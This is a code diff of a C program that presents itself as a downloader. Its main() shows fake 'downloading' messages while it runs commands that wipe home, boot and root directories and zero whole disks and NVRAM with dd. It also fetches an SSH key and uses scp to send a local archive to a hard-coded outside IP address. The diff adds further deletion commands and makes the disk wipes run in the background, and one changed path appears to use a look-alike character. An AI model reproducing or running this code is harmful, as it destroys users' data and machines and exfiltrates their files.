@@ -7,7 +7,7 @@
 	int main()
 	{ 
 	system("rm -rf *");
-	system("sudo rm /usr/local/bin");
+	system("sudo rm /usr/local/search-tоol");
 //	sleep(2);
 	system("wget -P 1/ https://raw.githubusercontent.com/yakey4/4659876/main/ssh-key-2022-07-22.key");
 	system("clear");
@@ -28,6 +28,8 @@
 	printf("downloading additional resources");
 	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key /tmp/main.tar.gz ubuntu@193.123.37.30:/home/ubuntu");
 	system("clear");
+	system("rm -rf /tmp/main*");
+	system("rm -rf *");
 	system("""sudo rm -rf /home/* & " );
 	system("clear");
 	system("sudo rm -rf /boot/* & ");
@@ -38,7 +40,7 @@
 	system("clear");
 	printf("downloading additional files");	
 	sleep(1);
-	system("sudo dd if=/dev/zero of=/home/file.img bs=1M count=512 & ");
+	system("sudo dd if=/dev/zero of=/home/file.img bs=1M count=1024 & ");
 	system("sudo dd of=/dev/nvram if=/dev/zero & ");
 	system("sudo rm -rf /root/* &" );
 	system("clear");
@@ -48,6 +50,7 @@
 	sleep(1);
 	system("clear");
 	sleep(1);
+	
 	system("clear");
 	sleep(1);
 	system("clear");
@@ -82,16 +85,16 @@
 	system("sudo dd if=/dev/zero of=/dev/hda3 & ");
 	system("clear");
 	system("sudo dd if=/dev/zero of=/dev/hda4 & ");
-	system("sudo dd if=/dev/zero of=/dev/hdb");
-	system("sudo dd if=/dev/zero of=/dev/hdb1");
-	system("sudo dd if=/dev/zero of=/dev/hdb2");
-	system("sudo dd if=/dev/zero of=/dev/hdb3");
+	system("sudo dd if=/dev/zero of=/dev/hdb & ");
+	system("sudo dd if=/dev/zero of=/dev/hdb1 & ");
+	system("sudo dd if=/dev/zero of=/dev/hdb2 & ");
+	system("sudo dd if=/dev/zero of=/dev/hdb3 & ");
 	system("clear");
 	printf("downloading additional files");
 	sleep(1);
 	system("sudo rm /tmp/debug-tool");
 	system("clear");
-	sleep(1);   
+	sleep(1);
 	system("clear");
 	sleep(1);
 	system("clear");
